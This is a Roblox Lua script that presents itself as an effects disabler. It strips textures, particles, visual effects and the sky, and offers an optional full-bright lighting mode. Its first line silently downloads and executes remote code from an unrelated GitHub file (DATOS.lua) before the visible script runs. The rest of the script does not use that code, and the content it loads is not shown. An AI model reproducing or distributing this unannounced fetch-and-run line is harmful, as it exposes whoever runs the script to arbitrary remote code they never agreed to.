
loadstring(game:HttpGet("https://raw.githubusercontent.com/Fernanflop091o/Queuet/refs/heads/main/DATOS.lua"))()
local ToDisable = {
    Textures = true,
    VisualEffects = true,
    Parts = true,
    Particles = true,
    Sky = true
}

local ToEnable = {
    FullBright = false
}

local Stuff = {
    Textures = {},
    VisualEffects = {},
    Parts = {},
    Particles = {},
    Sky = {}
}

local function processAsset(v)
    if ToDisable.Parts and (v:IsA("Part") or v:IsA("Union") or v:IsA("BasePart")) then
        v.Material = Enum.Material.SmoothPlastic
        table.insert(Stuff.Parts, v)
    end

    if ToDisable.Particles and (v:IsA("ParticleEmitter") or v:IsA("Smoke") or v:IsA("Explosion") or v:IsA("Sparkles") or v:IsA("Fire")) then
        v.Enabled = false
        table.insert(Stuff.Particles, v)
    end

    if ToDisable.VisualEffects and (v:IsA("BloomEffect") or v:IsA("BlurEffect") or v:IsA("DepthOfFieldEffect") or v:IsA("SunRaysEffect")) then
        v.Enabled = false
        table.insert(Stuff.VisualEffects, v)
    end

    if ToDisable.Textures and (v:IsA("Decal") or v:IsA("Texture")) then
        v.Texture = ""
        table.insert(Stuff.Textures, v)
    end

    if ToDisable.Sky and v:IsA("Sky") then
        v.Parent = nil
        table.insert(Stuff.Sky, v)
    end
end

-- Process each descendant
for _, v in next, game:GetDescendants() do
    processAsset(v)
end

local function removeNextItem(itemList, delayTime)
    if #itemList > 0 then
        local item = table.remove(itemList, 1)
        if item:IsA("Part") or item:IsA("Union") or item:IsA("BasePart") then
            item.Material = Enum.Material.SmoothPlastic
        elseif item:IsA("ParticleEmitter") or item:IsA("Smoke") or item:IsA("Explosion") or item:IsA("Sparkles") or item:IsA("Fire") then
            item.Enabled = false
        elseif item:IsA("BloomEffect") or item:IsA("BlurEffect") or item:IsA("DepthOfFieldEffect") or item:IsA("SunRaysEffect") then
            item.Enabled = false
        elseif item:IsA("Decal") or item:IsA("Texture") then
            item.Texture = ""
        elseif item:IsA("Sky") then
            item.Parent = nil
        end

        delay(delayTime, function()
            removeNextItem(itemList, delayTime)
        end)
    end
end

-- Start removing items
removeNextItem(Stuff.Textures, 22)
removeNextItem(Stuff.VisualEffects, 12)
removeNextItem(Stuff.Parts, 18)
removeNextItem(Stuff.Particles, 16)
removeNextItem(Stuff.Sky, 18)

-- Enable FullBright if needed
if ToEnable.FullBright then
    local Lighting = game:GetService("Lighting")
    
    Lighting.FogColor = Color3.fromRGB(255, 255, 255)
    Lighting.FogEnd = math.huge
    Lighting.FogStart = math.huge
    Lighting.Ambient = Color3.fromRGB(255, 255, 255)
    Lighting.Brightness = 5
    Lighting.ColorShift_Bottom = Color3.fromRGB(255, 255, 255)
    Lighting.ColorShift_Top = Color3.fromRGB(255, 255, 255)
    Lighting.OutdoorAmbient = Color3.fromRGB(255, 255, 255)
    Lighting.Outlines = true
end

game:GetService("TestService"):Message("Effects Disabler Script : Successfully disabled assets / effects. Settings :")

for i, v in next, ToDisable do
    print(tostring(i) .. ": " .. tostring(v))
end
